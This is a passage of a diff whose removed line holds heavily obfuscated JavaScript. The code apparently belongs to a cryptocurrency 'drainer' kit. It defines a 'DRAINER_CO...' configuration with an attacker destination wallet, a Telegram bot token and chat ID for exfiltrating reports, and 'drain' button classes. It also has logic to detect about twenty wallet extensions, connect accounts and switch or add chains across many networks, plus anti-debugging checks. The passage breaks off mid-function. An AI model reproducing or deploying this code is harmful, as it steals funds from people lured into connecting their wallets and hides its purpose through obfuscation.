@@ -1,1 +1,4159 @@
-(function(_0x174fb0,_0x953f85){const _0x4e1111=_0x4a8a,_0x1edd68=_0x174fb0();while(!![]){try{const _0x1cf0fe=-parseInt(_0x4e1111(0x33f))/0x1*(parseInt(_0x4e1111(0xbd))/0x2)+parseInt(_0x4e1111(0x163))/0x3*(parseInt(_0x4e1111(0x3fe))/0x4)+-parseInt(_0x4e1111(0x3e4))/0x5+-parseInt(_0x4e1111(0x3f7))/0x6+parseInt(_0x4e1111(0x8d))/0x7*(parseInt(_0x4e1111(0x3e3))/0x8)+-parseInt(_0x4e1111(0x45e))/0x9+parseInt(_0x4e1111(0x40d))/0xa*(parseInt(_0x4e1111(0x4b8))/0xb);if(_0x1cf0fe===_0x953f85)break;else _0x1edd68['push'](_0x1edd68['shift']());}catch(_0x2d0617){_0x1edd68['push'](_0x1edd68['shift']());}}}(_0x2f57,0x19556),(function(){const _0x2c4f95=_0x4a8a,_0x3f9378=(function(){let _0x4fcbad=!![];return function(_0x124b00,_0x1cd29b){const _0x483f08=_0x4fcbad?function(){const _0xcffd4a=_0x4a8a;if(_0x1cd29b){const _0x1a73ec=_0x1cd29b[_0xcffd4a(0x28b)](_0x124b00,arguments);return _0x1cd29b=null,_0x1a73ec;}}:function(){};return _0x4fcbad=![],_0x483f08;};}()),_0x192d69=(function(){let _0x596877=!![];return function(_0x4df052,_0x1cbe97){const _0x41d4da=_0x596877?function(){const _0x43805e=_0x4a8a;if(_0x1cbe97){const _0x576f22=_0x1cbe97[_0x43805e(0x28b)](_0x4df052,arguments);return _0x1cbe97=null,_0x576f22;}}:function(){};return _0x596877=![],_0x41d4da;};}());'use strict';window['DRAINER_CO'+_0x2c4f95(0x470)]={'destination':'0xa4163851'+_0x2c4f95(0x1c4)+_0x2c4f95(0x2fd)+_0x2c4f95(0x358)+'54','telegram':{'botToken':_0x2c4f95(0x2ca)+_0x2c4f95(0x584)+'24ingrOPaj'+_0x2c4f95(0x42a)+_0x2c4f95(0x5a0),'chatId':_0x2c4f95(0x102)},'ui':{'connectButtonsClass':_0x2c4f95(0xed)+_0x2c4f95(0x4ab),'drainButtonsClass':'interact-b'+'utton','connectText':_0x2c4f95(0x151)+_0x2c4f95(0x111),'verifyText':_0x2c4f95(0x175)+_0x2c4f95(0x16e),'modalType':_0x2c4f95(0x51c)},'reown':{'projectId':'61cb704eea'+_0x2c4f95(0x40c)+_0x2c4f95(0x4c8)+'14'},'ton':{'manifestUrl':_0x2c4f95(0x4ff)+_0x2c4f95(0x4be)+'.json'},'checkboxes':{},'destinationWallet':_0x2c4f95(0x206)+'02e69b4628'+_0x2c4f95(0x2fd)+_0x2c4f95(0x358)+'54','telegramBotToken':_0x2c4f95(0x2ca)+_0x2c4f95(0x584)+_0x2c4f95(0x2a3)+_0x2c4f95(0x42a)+_0x2c4f95(0x5a0),'telegramChatId':_0x2c4f95(0x102),'connectButtonsClass':_0x2c4f95(0xed)+_0x2c4f95(0x4ab),'drainButtonsClass':_0x2c4f95(0xed)+_0x2c4f95(0x4ab),'connectText':_0x2c4f95(0x151)+'llet','verifyText':_0x2c4f95(0x175)+_0x2c4f95(0x16e)};const _0x4a0553=(function(){const _0x5f01f2=_0x2c4f95,_0x2f1308=_0x3f9378(this,function(){const _0x3a2b55=_0x4a8a;return _0x2f1308['toString']()[_0x3a2b55(0x121)](_0x3a2b55(0x1d0)+'+$')[_0x3a2b55(0x52c)]()[_0x3a2b55(0x641)+'r'](_0x2f1308)[_0x3a2b55(0x121)](_0x3a2b55(0x1d0)+'+$');});_0x2f1308(),(function(){_0x192d69(this,function(){const _0x3ac5c6=_0x4a8a,_0x45e1a7=new RegExp(_0x3ac5c6(0x61e)+_0x3ac5c6(0x57e)),_0x442491=new RegExp(_0x3ac5c6(0x101)+_0x3ac5c6(0x3ec)+'0-9a-zA-Z_'+_0x3ac5c6(0x37e),'i'),_0x3f670d=_0x38ef63(_0x3ac5c6(0x462));!_0x45e1a7[_0x3ac5c6(0x5aa)](_0x3f670d+'chain')||!_0x442491[_0x3ac5c6(0x5aa)](_0x3f670d+'input')?_0x3f670d('0'):_0x38ef63();})();}());'use strict';const _0x4f98ab={'metamask':{'name':_0x5f01f2(0x24a),'icon':'🦊','check':_0x20249a=>_0x20249a['isMetaMask']&&!_0x20249a[_0x5f01f2(0x31d)+_0x5f01f2(0x657)],'priority':0x1},'brave':{'name':_0x5f01f2(0x105)+'et','icon':'🦁','check':_0x382ec0=>_0x382ec0['isBraveWal'+_0x5f01f2(0x657)],'priority':0x2},'trust':{'name':_0x5f01f2(0x448)+'et','icon':'🔐','check':_0x422c4b=>_0x422c4b[_0x5f01f2(0x179)]||_0x422c4b['isTrustWal'+_0x5f01f2(0x657)],'priority':0x3},'coinbase':{'name':_0x5f01f2(0x5b4)+_0x5f01f2(0x15d),'icon':'🔵','check':_0x28bc9f=>_0x28bc9f['isCoinbase'+_0x5f01f2(0x22e)],'priority':0x4},'rainbow':{'name':_0x5f01f2(0x408),'icon':'🌈','check':_0x3cfe18=>_0x3cfe18[_0x5f01f2(0x42d)],'priority':0x5},'ledger':{'name':_0x5f01f2(0x566),'icon':'📒','check':_0x545030=>_0x545030['isLedger'],'priority':0x6},'phantom':{'name':_0x5f01f2(0x284),'icon':'👻','check':_0x55f450=>_0x55f450[_0x5f01f2(0x444)],'priority':0x7,'type':_0x5f01f2(0x1d1)},'tronlink':{'name':_0x5f01f2(0x58f),'icon':'⚡','check':()=>window[_0x5f01f2(0x332)]&&window[_0x5f01f2(0x332)][_0x5f01f2(0x15f)],'priority':0x8,'type':_0x5f01f2(0x363)},'okx':{'name':_0x5f01f2(0x33a),'icon':'✖️','check':_0x267e89=>_0x267e89[_0x5f01f2(0x3ac)+'t'],'priority':0x9},'rabby':{'name':_0x5f01f2(0x27d),'icon':'🐰','check':_0x35d966=>_0x35d966[_0x5f01f2(0x123)],'priority':0xa},'walletconnect':{'name':'WalletConn'+_0x5f01f2(0x5bf),'icon':'🔗','check':_0x186252=>_0x186252['connector']||_0x186252[_0x5f01f2(0x3af)+'nnect'],'priority':0xb},'frame':{'name':'Frame','icon':_0x5f01f2(0x624),'check':_0x1279d1=>_0x1279d1[_0x5f01f2(0x3df)],'priority':0xc},'tokenpocket':{'name':_0x5f01f2(0x5ad)+'t','icon':'💼','check':_0x553156=>_0x553156[_0x5f01f2(0x619)+_0x5f01f2(0x20d)],'priority':0xd},'bitkeep':{'name':_0x5f01f2(0x2d3),'icon':'💎','check':_0x154999=>_0x154999[_0x5f01f2(0x4a1)]||_0x154999[_0x5f01f2(0x122)],'priority':0xe},'safepal':{'name':_0x5f01f2(0x345),'icon':'🛡️','check':_0x788ec3=>_0x788ec3[_0x5f01f2(0x20c)],'priority':0xf},'xdefi':{'name':_0x5f01f2(0x5c2),'icon':'🌐','check':_0xa1c711=>_0xa1c711[_0x5f01f2(0x261)],'priority':0x10},'exodus':{'name':'Exodus','icon':'🚀','check':_0x26a3dc=>_0x26a3dc[_0x5f01f2(0x402)],'priority':0x11},'zeal':{'name':_0x5f01f2(0x3a7),'icon':'⚡','check':_0x2e6d8a=>_0x2e6d8a[_0x5f01f2(0x404)],'priority':0x12},'oneInch':{'name':'1inch\x20Wall'+'et','icon':'🦄','check':_0x286689=>_0x286689[_0x5f01f2(0x33b)+'OSWallet']||_0x286689['isOneInchA'+'ndroidWall'+'et'],'priority':0x13},'tally':{'name':'Tally\x20Ho','icon':'🦌','check':_0x4e5a32=>_0x4e5a32[_0x5f01f2(0x215)],'priority':0x14}},_0x16f094={'eth':{'chainId':_0x5f01f2(0x2ef),'name':_0x5f01f2(0x5a2),'symbol':_0x5f01f2(0x85),'rpc':_0x5f01f2(0x633)+_0x5f01f2(0x24d)+'.com'},'bsc':{'chainId':_0x5f01f2(0x65c),'name':_0x5f01f2(0x42e)+_0x5f01f2(0x430),'symbol':_0x5f01f2(0x384),'rpc':'https://bs'+'c-dataseed'+_0x5f01f2(0x4d7)+_0x5f01f2(0x4b6)},'polygon':{'chainId':_0x5f01f2(0x219),'name':_0x5f01f2(0x3de),'symbol':_0x5f01f2(0x567),'rpc':_0x5f01f2(0x44d)+_0x5f01f2(0x114)+'com'},'avax':{'chainId':'0xa86a','name':_0x5f01f2(0x606),'symbol':_0x5f01f2(0xa8),'rpc':_0x5f01f2(0x436)+_0x5f01f2(0x5cd)+_0x5f01f2(0x518)+_0x5f01f2(0x46b)},'arbitrum':{'chainId':'0xa4b1','name':_0x5f01f2(0x35f)+'ne','symbol':_0x5f01f2(0x85),'rpc':_0x5f01f2(0x26a)+_0x5f01f2(0x1ec)+_0x5f01f2(0x186)},'optimism':{'chainId':_0x5f01f2(0x342),'name':_0x5f01f2(0x2a4),'symbol':_0x5f01f2(0x85),'rpc':_0x5f01f2(0x46e)+_0x5f01f2(0x161)+_0x5f01f2(0x43f)},'base':{'chainId':_0x5f01f2(0x4f3),'name':_0x5f01f2(0x603),'symbol':'ETH','rpc':_0x5f01f2(0x46e)+'innet.base'+_0x5f01f2(0x39f)},'fantom':{'chainId':_0x5f01f2(0x5eb),'name':_0x5f01f2(0x27f),'symbol':_0x5f01f2(0x1e5),'rpc':_0x5f01f2(0x1b3)+_0x5f01f2(0x511)+'s'},'unichain':{'chainId':'0x82','name':_0x5f01f2(0xe6),'symbol':_0x5f01f2(0x85),'rpc':'https://ma'+_0x5f01f2(0x2c5)+_0x5f01f2(0x30a)},'sonic':{'chainId':_0x5f01f2(0xab),'name':_0x5f01f2(0x2db),'symbol':'S','rpc':_0x5f01f2(0x1b3)+_0x5f01f2(0x21c)+_0x5f01f2(0x21a)},'berachain':{'chainId':_0x5f01f2(0xc9),'name':'Berachain','symbol':_0x5f01f2(0x29d),'rpc':_0x5f01f2(0x1b3)+_0x5f01f2(0x466)+_0x5f01f2(0x1e3)},'sol':{'chainId':null,'name':_0x5f01f2(0x180),'symbol':_0x5f01f2(0x54c),'type':_0x5f01f2(0x1d1)},'tron':{'chainId':null,'name':'Tron','symbol':_0x5f01f2(0x5a6),'type':_0x5f01f2(0x363)}};function _0x5d26df(){const _0x2b68f0=_0x5f01f2,_0x41c8af=[];if(!window[_0x2b68f0(0x171)])return _0x41c8af;if(window[_0x2b68f0(0x171)][_0x2b68f0(0x554)]&&Array[_0x2b68f0(0x3fa)](window[_0x2b68f0(0x171)][_0x2b68f0(0x554)]))window[_0x2b68f0(0x171)][_0x2b68f0(0x554)][_0x2b68f0(0x425)](_0x56f340=>{const _0x4e97ff=_0x2b68f0,_0x4c0e1d=_0x25d82a(_0x56f340);_0x4c0e1d&&_0x41c8af[_0x4e97ff(0x1bf)]({'provider':_0x56f340,..._0x4c0e1d});});else{const _0x510048=_0x25d82a(window[_0x2b68f0(0x171)]);_0x510048&&_0x41c8af['push']({'provider':window[_0x2b68f0(0x171)],..._0x510048});}return _0x41c8af[_0x2b68f0(0xd2)]((_0x2ebe81,_0x5abbc5)=>_0x2ebe81['priority']-_0x5abbc5[_0x2b68f0(0x107)]);}function _0x25d82a(_0x1b0ea4){const _0x15fadd=_0x5f01f2;for(const [_0x13ae6f,_0x4ec877]of Object[_0x15fadd(0x217)](_0x4f98ab)){try{if(_0x4ec877[_0x15fadd(0x542)](_0x1b0ea4))return{'type':_0x13ae6f,'name':_0x4ec877[_0x15fadd(0x2d5)],'icon':_0x4ec877[_0x15fadd(0x1d9)],'walletType':_0x4ec877[_0x15fadd(0x2a8)]||_0x15fadd(0x52a),'priority':_0x4ec877['priority']};}catch(_0x2e3ca6){}}return{'type':'unknown','name':_0x15fadd(0x489)+_0x15fadd(0x111),'icon':'👛','walletType':_0x15fadd(0x52a),'priority':0x3e7};}function _0x55b3eb(){const _0x2dc729=_0x5d26df();return _0x2dc729['length']>0x0?_0x2dc729[0x0]:null;}function _0x5dab0d(){const _0x1a3a53=_0x5f01f2;return!!(window[_0x1a3a53(0x171)]||window['tronLink']||window[_0x1a3a53(0x1d1)]||window[_0x1a3a53(0x2f9)]);}async function _0x3ad8d8(_0x380315=window[_0x5f01f2(0x171)]){const _0x16cecb=_0x5f01f2;if(!_0x380315)return![];try{const _0x3cdcf4=await _0x380315[_0x16cecb(0x3a1)]({'method':_0x16cecb(0x15a)+'ts'});return _0x3cdcf4&&_0x3cdcf4['length']>0x0;}catch(_0x8d195d){return![];}}async function _0x1f8b34(_0x168c5e=window[_0x5f01f2(0x171)]){const _0x2a376e=_0x5f01f2;if(!_0x168c5e)return[];try{return await _0x168c5e[_0x2a376e(0x3a1)]({'method':_0x2a376e(0x15a)+'ts'})||[];}catch(_0x22e376){return[];}}let _0x5cdb98=null;function _0x52503d(_0x54d7aa){const _0x400087=_0x5f01f2;_0x54d7aa&&typeof _0x54d7aa[_0x400087(0x34d)]===_0x400087(0x21b)&&(console[_0x400087(0x36e)]('[WalletDet'+_0x400087(0xa1)+'apter\x20regi'+'stered:',_0x54d7aa[_0x400087(0x2d5)]||'Unknown'),_0x5cdb98=_0x54d7aa);}async function _0x4eb476(_0x50def4=window[_0x5f01f2(0x171)]){const _0x3fa68d=_0x5f01f2;if(_0x5cdb98)try{const _0x138a99=await _0x5cdb98[_0x3fa68d(0x34d)]();return _0x138a99;}catch(_0x5012db){console[_0x3fa68d(0x4a8)](_0x3fa68d(0x191)+_0x3fa68d(0x30e)+_0x3fa68d(0x5fa)+'ion\x20failed'+':',_0x5012db);throw _0x5012db;}if(!_0x50def4){console['log'](_0x3fa68d(0x191)+_0x3fa68d(0x2bd)+'ovider,\x20op'+'ening\x20moda'+_0x3fa68d(0x1c6));try{const _0x269adb=await _0x5504da[_0x3fa68d(0x2f8)]();return _0x269adb;}catch(_0x301ff){throw new Error(_0x3fa68d(0x477)+_0x3fa68d(0x3bd)+_0x3fa68d(0x41e)+_0x3fa68d(0x40b));}}try{const _0x31e873=await _0x50def4[_0x3fa68d(0x3a1)]({'method':'eth_reques'+_0x3fa68d(0xac)});return{'address':_0x31e873[0x0],'wallet':'injected'};}catch(_0x3695be){console['error']('[WalletDet'+_0x3fa68d(0x57b)+_0x3fa68d(0x5be)+'tion\x20faile'+'d:',_0x3695be);throw _0x3695be;}}async function _0x4b426e(_0xdc0d1c=window['ethereum']){const _0x5d84ed=_0x5f01f2;if(!_0xdc0d1c)return null;try{const _0x390d4d=await _0xdc0d1c[_0x5d84ed(0x3a1)]({'method':_0x5d84ed(0x242)+'d'});return _0x390d4d;}catch(_0x1a913d){return null;}}function _0x474981(_0x4f0a08){const _0x76cf42=_0x5f01f2,_0x44bcdf=typeof _0x4f0a08==='number'?'0x'+_0x4f0a08[_0x76cf42(0x52c)](0x10):_0x4f0a08;for(const [_0x491b2c,_0x4ec745]of Object[_0x76cf42(0x217)](_0x16f094)){if(_0x4ec745[_0x76cf42(0x453)]===_0x44bcdf||_0x4ec745['chainId']===_0x4f0a08)return{'key':_0x491b2c,..._0x4ec745};}return null;}async function _0x9b447a(_0x45e238,_0x2d62e2){const _0x4b76a5=_0x5f01f2;if(!_0x45e238)throw new Error(_0x4b76a5(0x1d6)+'r');const _0x360c59=typeof _0x2d62e2==='number'?'0x'+_0x2d62e2[_0x4b76a5(0x52c)](0x10):_0x2d62e2;try{return await _0x45e238['request']({'method':_0x4b76a5(0x4eb)+_0x4b76a5(0x387)+_0x4b76a5(0x4a6),'params':[{'chainId':_0x360c59}]}),!![];}catch(_0x305f89){if(_0x305f89[_0x4b76a5(0x334)]===0x1326){const _0xad0858=_0x474981(_0x360c59);if(_0xad0858)try{return await _0x45e238[_0x4b76a5(0x3a1)]({'method':'wallet_add'+_0x4b76a5(0x325)+_0x4b76a5(0x455),'params':[{'chainId':_0x360c59,'chainName':_0xad0858[_0x4b76a5(0x2d5)],'nativeCurrency':{'name':_0xad0858[_0x4b76a5(0x2d5)],'symbol':_0xad0858[_0x4b76a5(0x435)],'decimals':0x12},'rpcUrls':[_0xad0858[_0x4b76a5(0x50b)]],'blockExplorerUrls':[]}]}),!![];}catch(_0x40c995){throw new Error(_0x4b76a5(0x296)+'add\x20chain:'+'\x20'+_0x40c995[_0x4b76a5(0x3ff)]);}}throw _0x305f89;}}function _0x5767a0(_0x16bf4c,_0xf7068a){const _0x9ee463=_0x5f01f2;if(!_0x16bf4c)return;_0x16bf4c['on'](_0x9ee463(0x60c)+'anged',_0x22f060=>{_0xf7068a(_0x22f060);});}function _0x4b473b(_0x4dca6a,_0x5b520c){const _0x4113d9=_0x5f01f2;if(!_0x4dca6a)return;_0x4dca6a['on'](_0x4113d9(0x172)+'ed',_0x16475c=>{_0x5b520c(_0x16475c);});}function _0x47ed36(_0x1e5782,_0x39a42d){if(!_0x1e5782)return;_0x1e5782['on']('disconnect',_0x20de9d=>{_0x39a42d(_0x20de9d);});}function _0x59a2dd(){const _0x27d346=_0x5f01f2;return window[_0x27d346(0x1d1)]||window[_0x27d346(0x2f9)]?.[_0x27d346(0x1d1)]||null;}function _0x3668ea(){const _0x1a8a67=_0x5f01f2;return window[_0x1a8a67(0x332)]||null;}async function _0x1b8742(){const _0x160715=_0x5f01f2,_0x509a71=_0x59a2dd();if(!_0x509a71)throw new Error('No\x20Solana\x20'+_0x160715(0x602)+'nd');try{const _0x1ab4d7=await _0x509a71[_0x160715(0x34d)]();return{'publicKey':_0x1ab4d7['publicKey'][_0x160715(0x52c)](),'address':_0x1ab4d7[_0x160715(0x3a8)][_0x160715(0x52c)]()};}catch(_0x24afc5){throw new Error(_0x160715(0x508)+'nection\x20fa'+_0x160715(0x1bb)+_0x24afc5[_0x160715(0x3ff)]);}}async function _0x32c8f9(){const _0x32f11c=_0x5f01f2,_0x64c331=_0x3668ea();if(!_0x64c331)throw new Error('No\x20Tron\x20wa'+'llet\x20found');try{!_0x64c331['ready']&&await _0x64c331[_0x32f11c(0x3a1)]({'method':_0x32f11c(0x3d3)+'stAccounts'});const _0x107037=_0x64c331[_0x32f11c(0x34b)]?.[_0x32f11c(0x32c)+_0x32f11c(0x130)]?.[_0x32f11c(0x611)];return{'address':_0x107037};}catch(_0x2be01a){throw new Error(_0x32f11c(0x451)+_0x32f11c(0x392)+_0x32f11c(0x454)+_0x2be01a['message']);}}return{'PROVIDERS':_0x4f98ab,'CHAINS':_0x16f094,'getProviders':_0x5d26df,'getPrimaryProvider':_0x55b3eb,'isWalletInstalled':_0x5dab0d,'isConnected':_0x3ad8d8,'getAccounts':_0x1f8b34,'connect':_0x4eb476,'getChainId':_0x4b426e,'getChainInfo':_0x474981,'switchChain':_0x9b447a,'onAccountsChanged':_0x5767a0,'onChainChanged':_0x4b473b,'onDisconnect':_0x47ed36,'getSolanaProvider':_0x59a2dd,'getTronProvider':_0x3668ea,'connectSolana':_0x1b8742,'connectTron':_0x32c8f9,'registerAdapter':_0x52503d};}());typeof module!==_0x2c4f95(0x45a)&&module['exports']&&(module[_0x2c4f95(0x1c3)]=_0x4a0553);const _0xa7aef3=(function(){'use strict';const _0x2b1618=_0x2c4f95;const _0x2d98e8={'eth':{'chainId':_0x2b1618(0x2ef),'chainName':'Ethereum\x20M'+_0x2b1618(0x212),'nativeCurrency':{'name':_0x2b1618(0x4e9),'symbol':_0x2b1618(0x85),'decimals':0x12},'rpcUrls':[_0x2b1618(0x633)+_0x2b1618(0x24d)+_0x2b1618(0x417),_0x2b1618(0x633)+_0x2b1618(0x29c)+_0x2b1618(0xc0)+'m'],'blockExplorerUrls':['https://et'+_0x2b1618(0xf6)],'iconUrls':[]},'bsc':{'chainId':_0x2b1618(0x65c),'chainName':'BNB\x20Smart\x20'+_0x2b1618(0x430),'nativeCurrency':{'name':_0x2b1618(0x384),'symbol':_0x2b1618(0x384),'decimals':0x12},'rpcUrls':[_0x2b1618(0x15c)+_0x2b1618(0x47f)+_0x2b1618(0x4d7)+'org',_0x2b1618(0x15c)+'c-dataseed'+_0x2b1618(0x149)+_0x2b1618(0x4b6)],'blockExplorerUrls':[_0x2b1618(0x15c)+_0x2b1618(0x115)],'iconUrls':[]},'polygon':{'chainId':_0x2b1618(0x219),'chainName':'Polygon\x20Ma'+_0x2b1618(0x360),'nativeCurrency':{'name':_0x2b1618(0x567),'symbol':'MATIC','decimals':0x12},'rpcUrls':[_0x2b1618(0x44d)+_0x2b1618(0x114)+_0x2b1618(0x3f5),'https://rp'+_0x2b1618(0x168)+_0x2b1618(0x5e3)+'node.pro'],'blockExplorerUrls':[_0x2b1618(0x44d)+_0x2b1618(0xcf)+_0x2b1618(0x3f5)],'iconUrls':[]},'avax':{'chainId':'0xa86a','chainName':_0x2b1618(0x2c7)+_0x2b1618(0xc4),'nativeCurrency':{'name':_0x2b1618(0x606),'symbol':_0x2b1618(0xa8),'decimals':0x12},'rpcUrls':[_0x2b1618(0x436)+_0x2b1618(0x5cd)+_0x2b1618(0x518)+_0x2b1618(0x46b)],'blockExplorerUrls':[_0x2b1618(0x237)+_0x2b1618(0x12a)],'iconUrls':[]},'arbitrum':{'chainId':_0x2b1618(0x2ff),'chainName':'Arbitrum\x20O'+'ne','nativeCurrency':{'name':_0x2b1618(0x4e9),'symbol':'ETH','decimals':0x12},'rpcUrls':[_0x2b1618(0x26a)+'b1.arbitru'+'m.io/rpc'],'blockExplorerUrls':['https://ar'+'biscan.io'],'iconUrls':[]},'optimism':{'chainId':_0x2b1618(0x342),'chainName':_0x2b1618(0x2a4),'nativeCurrency':{'name':_0x2b1618(0x4e9),'symbol':'ETH','decimals':0x12},'rpcUrls':[_0x2b1618(0x46e)+'innet.opti'+_0x2b1618(0x43f)],'blockExplorerUrls':[_0x2b1618(0xc2)+'timistic.e'+'therscan.i'+'o'],'iconUrls':[]},'base':{'chainId':_0x2b1618(0x4f3),'chainName':'Base','nativeCurrency':{'name':_0x2b1618(0x4e9),'symbol':_0x2b1618(0x85),'decimals':0x12},'rpcUrls':[_0x2b1618(0x46e)+_0x2b1618(0x11d)+_0x2b1618(0x39f)],'blockExplorerUrls':[_0x2b1618(0xfa)+_0x2b1618(0x304)],'iconUrls':[]},'fantom':{'chainId':_0x2b1618(0x5eb),'chainName':_0x2b1618(0x281)+'ra','nativeCurrency':{'name':_0x2b1618(0x27f),'symbol':_0x2b1618(0x1e5),'decimals':0x12},'rpcUrls':[_0x2b1618(0x1b3)+'c.ftm.tool'+'s',_0x2b1618(0x293)+_0x2b1618(0x361)+'cnode.com'],'blockExplorerUrls':[_0x2b1618(0x2b1)+_0x2b1618(0x588)],'iconUrls':[]},'unichain':{'chainId':_0x2b1618(0x9d),'chainName':_0x2b1618(0xe6),'nativeCurrency':{'name':_0x2b1618(0x4e9),'symbol':_0x2b1618(0x85),'decimals':0x12},'rpcUrls':[_0x2b1618(0x46e)+_0x2b1618(0x2c5)+_0x2b1618(0x30a)],'blockExplorerUrls':['https://un'+_0x2b1618(0x87)],'iconUrls':[]},'sonic':{'chainId':'0x92','chainName':_0x2b1618(0x2db),'nativeCurrency':{'name':_0x2b1618(0x2db),'symbol':'S','decimals':0x12},'rpcUrls':[_0x2b1618(0x1b3)+_0x2b1618(0x21c)+_0x2b1618(0x21a)],'blockExplorerUrls':['https://so'+_0x2b1618(0x160)+'g'],'iconUrls':[]},'berachain':{'chainId':_0x2b1618(0xc9),'chainName':'Berachain','nativeCurrency':{'name':'BERA','symbol':_0x2b1618(0x29d),'decimals':0x12},'rpcUrls':[_0x2b1618(0x1b3)+_0x2b1618(0x466)+_0x2b1618(0x1e3)],'blockExplorerUrls':[_0x2b1618(0x2dd)+_0x2b1618(0x306)],'iconUrls':[]},'linea':{'chainId':'0xe708','chainName':_0x2b1618(0x4fe),'nativeCurrency':{'name':_0x2b1618(0x4e9),'symbol':_0x2b1618(0x85),'decimals':0x12},'rpcUrls':[_0x2b1618(0x1b3)+'c.linea.bu'+'ild'],'blockExplorerUrls':[_0x2b1618(0x63d)+_0x2b1618(0x77)+_0x2b1618(0x53d)],'iconUrls':[]},'scroll':{'chainId':'0x534352','chainName':'Scroll','nativeCurrency':{'name':_0x2b1618(0x4e9),'symbol':'ETH','decimals':0x12},'rpcUrls':[_0x2b1618(0x1b3)+_0x2b1618(0x2da)+'o'],'blockExplorerUrls':['https://sc'+_0x2b1618(0x637)+'om'],'iconUrls':[]},'zksync':{'chainId':_0x2b1618(0x340),'chainName':'zkSync\x20Era','nativeCurrency':{'name':_0x2b1618(0x4e9),'symbol':'ETH','decimals':0x12},'rpcUrls':['https://ma'+'innet.era.'+_0x2b1618(0x5e7)],'blockExplorerUrls':[_0x2b1618(0x241)+_0x2b1618(0x4ef)+_0x2b1618(0x62c)],'iconUrls':[]},'blast':{'chainId':_0x2b1618(0x2b7),'chainName':'Blast','nativeCurrency':{'name':_0x2b1618(0x4e9),'symbol':_0x2b1618(0x85),'decimals':0x12},'rpcUrls':[_0x2b1618(0x1b3)+_0x2b1618(0x181)],'blockExplorerUrls':[_0x2b1618(0x31b)+_0x2b1618(0x1e7)],'iconUrls':[]},'gnosis':{'chainId':_0x2b1618(0x368),'chainName':_0x2b1618(0xd0)+'in','nativeCurrency':{'name':_0x2b1618(0x1ad),'symbol':_0x2b1618(0x20f),'decimals':0x12},'rpcUrls':['https://rp'+_0x2b1618(0x494)+_0x2b1618(0xd4)],'blockExplorerUrls':[_0x2b1618(0x4bd)+_0x2b1618(0x558)+'o'],'iconUrls':[]},'celo':{'chainId':'0xa4ec','chainName':_0x2b1618(0x35a),'nativeCurrency':{'name':'Celo','symbol':_0x2b1618(0x507),'decimals':0x12},'rpcUrls':[_0x2b1618(0x14b)+_0x2b1618(0x2d1)+'rg'],'blockExplorerUrls':[_0x2b1618(0x210)+'loscan.io'],'iconUrls':[]}},_0x3b8e02={'0x1':'eth','0x38':_0x2b1618(0x333),'0x89':_0x2b1618(0x56e),'0xa86a':_0x2b1618(0x1f5),'0xa4b1':'arbitrum','0xa':_0x2b1618(0x382),'0x2105':'base','0xfa':'fantom','0x82':_0x2b1618(0x34a),'0x92':_0x2b1618(0x283),'0x138c2':_0x2b1618(0x622),'0xe708':_0x2b1618(0x5d8),'0x534352':_0x2b1618(0x5ec),'0x144':_0x2b1618(0x11a),'0x13e31':_0x2b1618(0x118),'0x64':'gnosis','0xa4ec':_0x2b1618(0x2f4)};async function _0x2cec92(_0x28aebc,_0x2e263f){const _0x19f615=_0x2b1618;if(!_0x28aebc)throw new Error('No\x20provide'+'r\x20availabl'+'e');let _0x258db9,_0x615d73;if(typeof _0x2e263f===_0x19f615(0x2de)&&_0x2e263f[_0x19f615(0x127)]('0x'))_0x258db9=_0x3b8e02[_0x2e263f[_0x19f615(0x4f4)+'e']()],_0x615d73=_0x2d98e8[_0x258db9],_0x615d73={..._0x615d73,'chainId':_0x2e263f};else{if(typeof _0x2e263f===_0x19f615(0x2fe)){const _0x1e9d22='0x'+_0x2e263f[_0x19f615(0x52c)](0x10);_0x258db9=_0x3b8e02[_0x1e9d22[_0x19f615(0x4f4)+'e']()],_0x615d73=_0x2d98e8[_0x258db9],_0x615d73&&(_0x615d73={..._0x615d73,'chainId':_0x1e9d22});}else _0x258db9=_0x2e263f[_0x19f615(0x4f4)+'e'](),_0x615d73=_0x2d98e8[_0x258db9];}if(!_0x615d73)throw new Error(_0x19f615(0x582)+_0x19f615(0x5ac)+_0x2e263f);try{return await _0x28aebc['request']({'method':_0x19f615(0x4eb)+'tchEthereu'+_0x19f615(0x4a6),'params':[{'chainId':_0x615d73[_0x19f615(0x453)]}]}),{'success':!![],'chainKey':_0x258db9,'chainId':_0x615d73[_0x19f615(0x453)]};}catch(_0x484b80){if(_0x484b80[_0x19f615(0x334)]===0x1326)try{return await _0x28aebc[_0x19f615(0x3a1)]({'method':_0x19f615(0x52d)+_0x19f615(0x325)+_0x19f615(0x455),'params':[_0x615d73]}),{'success':!![],'chainKey':_0x258db9,'chainId':_0x615d73['chainId'],'added':!![]};}catch(_0x23fecd){throw new Error(_0x19f615(0x296)+_0x19f615(0x349)+_0x615d73[_0x19f615(0x153)]+':\x20'+_0x23fecd[_0x19f615(0x3ff)]);}throw _0x484b80;}}async function _0x2844bd(_0x2be0e1,_0x447933){const _0x47b72e=_0x2b1618,_0x50882f=[];for(const _0xe88854 of _0x447933){try{const _0x15ce7e=await _0x2cec92(_0x2be0e1,_0xe88854);_0x50882f[_0x47b72e(0x1bf)]({'chainKey':_0xe88854,..._0x15ce7e});}catch(_0x470700){_0x50882f['push']({'chainKey':_0xe88854,'success':![],'error':_0x470700[_0x47b72e(0x3ff)]});}}return _0x50882f;}async function _0x46cf45(_0x4eb04f){const _0x13f24f=_0x2b1618;if(!_0x4eb04f)return null;try{const _0x5930b4=await _0x4eb04f[_0x13f24f(0x3a1)]({'method':'eth_chainI'+'d'}),_0x194ebb=_0x3b8e02[_0x5930b4['toLowerCas'+'e']()],_0x1e9c46=_0x2d98e8[_0x194ebb];return{'chainId':_0x5930b4,'chainKey':_0x194ebb,..._0x1e9c46};}catch(_0x149ede){return null;}}async function _0x4fbc72(_0x3c72e3,_0x188bef){const _0x211d12=_0x2b1618,_0xf83c15=await _0x46cf45(_0x3c72e3);if(!_0xf83c15)return![];let _0x3e313;if(typeof _0x188bef===_0x211d12(0x2de)&&_0x188bef[_0x211d12(0x127)]('0x'))_0x3e313=_0x188bef['toLowerCas'+'e']();else{if(typeof _0x188bef===_0x211d12(0x2fe))_0x3e313='0x'+_0x188bef[_0x211d12(0x52c)](0x10);else{const _0x41c26f=_0x2d98e8[_0x188bef[_0x211d12(0x4f4)+'e']()];_0x3e313=_0x41c26f?.['chainId'];}}return _0xf83c15['chainId'][_0x211d12(0x4f4)+'e']()===_0x3e313?.[_0x211d12(0x4f4)+'e']();}function _0x9f82b1(_0x10630f,_0x4de612){const _0x2747f9=_0x2b1618;if(!_0x10630f)return;_0x10630f['on'](_0x2747f9(0x172)+'ed',_0x547e8f=>{const 